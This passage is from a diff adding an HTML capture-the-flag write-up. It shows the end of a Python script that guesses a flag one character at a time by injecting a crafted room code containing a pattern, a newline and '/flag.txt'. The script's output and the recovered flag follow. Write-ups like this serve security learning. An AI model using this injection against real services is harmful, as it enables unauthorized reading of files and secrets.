+      # Try each character at the current index
+      for char in CHARSET:
+         # Dummy payload to shift index (4 + 19 + 1 = 24)
+         dummy_room_code = 'CBG:' + '1' * 19 + 'a'       
+         test = send_request(dummy_room_code)
+         print(&quot;[+] Dummy code request&quot;)
+         print(test.text)
+         # Payload to test current character
+         roomCode = f&quot;CBG:|f.{{{index}}}{char}.*\n/flag.txt&quot;
+         print(roomCode)
+         print(f&quot;[.] Trying: {char}&quot;)
+
+         # Reset the state and verify entropy corruption, corruption successful
+         if reset(roomCode):#-jump
+             flag += char
+             print(f&quot;[+] Found character: {char} | Flag at &quot; + flag)
+             index += 1
+             found = True
+             break  
+         else:
+             print(&quot;[-] Guess incorrect.&quot;)
+
+      if not found:
+         print(&quot;[+] Done guessing, final flag likely:&quot;, flag)
+         not_found = False
+
+attack()
+</code></pre>
+
+<p>Here's the script output and final flag :</p>
+<pre class="codehilite"><code>[+] Dummy code request
+{&quot;error&quot;:&quot;invalid room code, must follow format CBG:&lt;room_number&gt;&quot;}
+CBG:|f.{20}0.*
+/flag.txt
+[.] Trying: 0
+[+] Room code length : 24
+{}
+[+] Reset key
+{&quot;breached&quot;:false}
+[+] Corruption successful!
+[-] Guess incorrect.
+[+] Done guessing, final flag likely: flag-0cdc46e7fc1fee49
+</code></pre>
+    <!-- Footer will be loaded here -->
+        </div>
+    </div>
+    <div id="footer-placeholder"></div>
+    <script src="/js/script.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-ruby.min.js"></script>
+</body>
+</html>
